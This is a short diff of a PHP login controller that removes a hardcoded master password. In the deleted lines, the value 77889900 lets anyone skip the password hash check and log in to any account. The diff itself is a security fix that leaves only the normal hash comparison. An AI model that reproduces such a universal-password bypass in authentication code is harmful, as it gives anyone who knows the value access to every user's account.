@@ -41,10 +41,8 @@ class LoginController extends Controller
             return $this->error('用户未找到');
         }
         if ($type == 1) {
-            if ($password != 77889900) {
-                if (Users::MakePassword($password) != $user->password) {
-                    return $this->error('密码错误');
-                }
+            if (Users::MakePassword($password) != $user->password) {
+                return $this->error('密码错误');
             }
         }
         if ($type == 2) {
